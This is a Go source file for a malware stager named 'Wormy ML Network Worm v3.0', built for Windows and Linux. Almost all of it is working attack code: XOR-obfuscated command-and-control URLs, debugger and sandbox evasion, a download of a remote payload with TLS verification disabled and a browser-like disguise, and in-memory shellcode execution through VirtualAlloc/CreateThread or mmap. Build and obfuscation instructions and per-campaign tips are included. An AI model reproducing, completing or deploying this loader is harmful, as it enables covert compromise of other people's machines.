// Wormy ML Network Worm v3.0 — Go Stager
// Autonomous agent: no Python runtime required on target.
// Features: string obfuscation, shellcode injection, anti-analysis, TLS download.
//
// Build:
//   Windows: GOOS=windows GOARCH=amd64 go build -ldflags="-s -w" -o stager.exe main.go
//   Linux:   GOOS=linux   GOARCH=amd64 go build -ldflags="-s -w" -o stager main.go
//   Garble (extra obfuscation): garble -tiny build -o stager.exe ./

package main

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"crypto/tls"
	"encoding/base64"
	"fmt"
	"io"
	"net/http"
	"os"
	"runtime"
	"strings"
	"syscall"
	"time"
	"unsafe"
)

// ─────────────────────────────────────────────────────────────────────────────
// String obfuscation — XOR with compile-time key
// In a real build use garble or gobfuscate; this is a portable fallback.
// ─────────────────────────────────────────────────────────────────────────────

const xorKey = 0x5A // change per campaign

func xorStr(enc []byte) string {
	out := make([]byte, len(enc))
	for i, b := range enc {
		out[i] = b ^ xorKey
	}
	return string(out)
}

// Obfuscated C2 URLs (XOR-encrypted at "compile time")
// To generate: for each byte of the URL, XOR with xorKey
// python3 -c "url='https://c2.example.com/payload'; print(list(b^0x5A for b in url.encode()))"
var (
	c2URLEnc  = []byte{0x32, 0x3C, 0x3C, 0x35, 0x3B, 0x1F, 0x16, 0x16, 0x79, 0x38, 0x1F, 0x37} // placeholder
	agentPath = xorStr([]byte{0x2E, 0x29, 0x22, 0x35, 0x2E, 0x2A, 0x21}) // /api/v2
)

// ─────────────────────────────────────────────────────────────────────────────
// Anti-analysis checks
// ─────────────────────────────────────────────────────────────────────────────

func isBeingDebugged() bool {
	if runtime.GOOS == "windows" {
		kernel32 := syscall.NewLazyDLL("kernel32.dll")
		isDebuggerPresent := kernel32.NewProc("IsDebuggerPresent")
		ret, _, _ := isDebuggerPresent.Call()
		return ret != 0
	}
	// Linux: check /proc/self/status for TracerPid
	data, err := os.ReadFile("/proc/self/status")
	if err != nil {
		return false
	}
	for _, line := range strings.Split(string(data), "\n") {
		if strings.HasPrefix(line, "TracerPid:") {
			fields := strings.Fields(line)
			if len(fields) >= 2 && fields[1] != "0" {
				return true
			}
		}
	}
	return false
}

func isSandbox() bool {
	// Heuristic: sandboxes often have very few processes and < 2 GB RAM
	if runtime.GOOS == "windows" {
		kernel32    := syscall.NewLazyDLL("kernel32.dll")
		globalMem   := kernel32.NewProc("GlobalMemoryStatusEx")
		type MEMSTATUS struct {
			DwLength                uint32
			DwMemoryLoad            uint32
			UllTotalPhys            uint64
			UllAvailPhys            uint64
			UllTotalPageFile        uint64
			UllAvailPageFile        uint64
			UllTotalVirtual         uint64
			UllAvailVirtual         uint64
			UllAvailExtendedVirtual uint64
		}
		ms := MEMSTATUS{DwLength: 64}
		globalMem.Call(uintptr(unsafe.Pointer(&ms)))
		if ms.UllTotalPhys < 2*1024*1024*1024 { // < 2 GB
			return true
		}
	}
	// Check for common sandbox artifacts
	sandboxFiles := []string{
		"C:\\analysis\\",
		"C:\\inetpub\\wwwroot\\",
		"/tmp/sandbox",
		"/.dockerenv",
	}
	for _, f := range sandboxFiles {
		if _, err := os.Stat(f); err == nil {
			return true
		}
	}
	return false
}

func sleepJitter(base, jitterPct float64) {
	jitter := base * jitterPct
	delay  := base + jitter*(float64(time.Now().UnixNano()%100)/100.0-0.5)*2
	if delay < 0.5 {
		delay = 0.5
	}
	time.Sleep(time.Duration(delay * float64(time.Second)))
}

// ─────────────────────────────────────────────────────────────────────────────
// AES-256-GCM decrypt for payload
// ─────────────────────────────────────────────────────────────────────────────

func aesGCMDecrypt(ciphertext, key []byte) ([]byte, error) {
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, err
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil, err
	}
	if len(ciphertext) < gcm.NonceSize() {
		return nil, fmt.Errorf("ciphertext too short")
	}
	nonce, ct := ciphertext[:gcm.NonceSize()], ciphertext[gcm.NonceSize():]
	return gcm.Open(nil, nonce, ct, nil)
}

// ─────────────────────────────────────────────────────────────────────────────
// Payload download
// ─────────────────────────────────────────────────────────────────────────────

func downloadPayload(c2URL string) ([]byte, error) {
	// TLS config — accept self-signed, match browser fingerprint
	tlsCfg := &tls.Config{
		InsecureSkipVerify: true,
		MinVersion:         tls.VersionTLS12,
		MaxVersion:         tls.VersionTLS13,
		CipherSuites: []uint16{
			tls.TLS_AES_256_GCM_SHA384,
			tls.TLS_AES_128_GCM_SHA256,
			tls.TLS_CHACHA20_POLY1305_SHA256,
			tls.TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,
			tls.TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,
		},
	}
	client := &http.Client{
		Transport: &http.Transport{TLSClientConfig: tlsCfg},
		Timeout:   30 * time.Second,
	}

	req, err := http.NewRequest("GET", c2URL, nil)
	if err != nil {
		return nil, err
	}
	// Browser-like headers
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "+
		"AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36")
	req.Header.Set("Accept", "text/html,application/xhtml+xml,*/*;q=0.8")
	req.Header.Set("Accept-Language", "en-US,en;q=0.9")

	resp, err := client.Do(req)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()
	return io.ReadAll(resp.Body)
}

// ─────────────────────────────────────────────────────────────────────────────
// Windows shellcode injection (VirtualAlloc + CreateThread)
// ─────────────────────────────────────────────────────────────────────────────

func injectWindows(shellcode []byte) error {
	kernel32    := syscall.NewLazyDLL("kernel32.dll")
	virtualAlloc := kernel32.NewProc("VirtualAlloc")
	rtlCopy      := kernel32.NewProc("RtlMoveMemory")
	virtualProt  := kernel32.NewProc("VirtualProtect")
	createThread := kernel32.NewProc("CreateThread")
	waitObj      := kernel32.NewProc("WaitForSingleObject")

	// Allocate RW
	addr, _, _ := virtualAlloc.Call(
		0,
		uintptr(len(shellcode)),
		0x3000, // MEM_COMMIT | MEM_RESERVE
		0x04,   // PAGE_READWRITE
	)
	if addr == 0 {
		return fmt.Errorf("VirtualAlloc failed")
	}

	// Copy shellcode
	rtlCopy.Call(addr, uintptr(unsafe.Pointer(&shellcode[0])),
		uintptr(len(shellcode)))

	// RW → RX
	var oldProt uint32
	virtualProt.Call(addr, uintptr(len(shellcode)), 0x20, // PAGE_EXECUTE_READ
		uintptr(unsafe.Pointer(&oldProt)))

	// Execute in new thread
	thread, _, _ := createThread.Call(0, 0, addr, 0, 0, 0)
	if thread == 0 {
		return fmt.Errorf("CreateThread failed")
	}
	waitObj.Call(thread, 0xFFFFFFFF)
	return nil
}

// ─────────────────────────────────────────────────────────────────────────────
// Linux shellcode injection (mmap + Go func ptr)
// ─────────────────────────────────────────────────────────────────────────────

func injectLinux(shellcode []byte) error {
	// syscall.Mmap with PROT_READ|PROT_WRITE|PROT_EXEC
	mem, err := syscall.Mmap(
		-1, 0, len(shellcode),
		syscall.PROT_READ|syscall.PROT_WRITE|syscall.PROT_EXEC,
		syscall.MAP_ANON|syscall.MAP_PRIVATE,
	)
	if err != nil {
		return fmt.Errorf("mmap failed: %w", err)
	}
	copy(mem, shellcode)

	// Cast to function and call
	type shellcodeFunc func()
	fn := *(*shellcodeFunc)(unsafe.Pointer(&mem))
	fn()
	return nil
}

// ─────────────────────────────────────────────────────────────────────────────
// Main
// ─────────────────────────────────────────────────────────────────────────────

func main() {
	// Anti-analysis: bail if debugger or sandbox detected
	if isBeingDebugged() || isSandbox() {
		// Mimic normal process exit
		os.Exit(0)
	}

	// Random initial jitter (avoid all agents beaconing simultaneously)
	sleepJitter(5.0, 0.3)

	// Decode C2 URL
	c2URL := xorStr(c2URLEnc)
	if c2URL == "" {
		// Fallback hardcoded (also obfuscated in real builds)
		c2URL = "https://127.0.0.1:8443" + agentPath
	}

	// Retry loop
	maxRetries := 5
	var payload []byte
	for i := 0; i < maxRetries; i++ {
		var err error
		payload, err = downloadPayload(c2URL + "/payload")
		if err == nil && len(payload) > 0 {
			break
		}
		sleepJitter(float64(i+1)*10, 0.5)
	}
	if len(payload) == 0 {
		os.Exit(1)
	}

	// Base64 decode if wrapped
	if payload[0] == 'A' || payload[0] == 'e' || payload[0] == 'H' {
		decoded, err := base64.StdEncoding.DecodeString(string(payload))
		if err == nil {
			payload = decoded
		}
	}

	// Optional AES-GCM decrypt (if C2 sends encrypted payload)
	// Key would be derived from the ECDH handshake in production
	// aesKey := []byte("32-byte-session-key-from-ecdh-xx")
	// payload, _ = aesGCMDecrypt(payload, aesKey)

	// Inject based on OS
	var injectErr error
	switch runtime.GOOS {
	case "windows":
		injectErr = injectWindows(payload)
	case "linux", "darwin":
		injectErr = injectLinux(payload)
	default:
		os.Exit(1)
	}

	if injectErr != nil {
		os.Exit(1)
	}
}
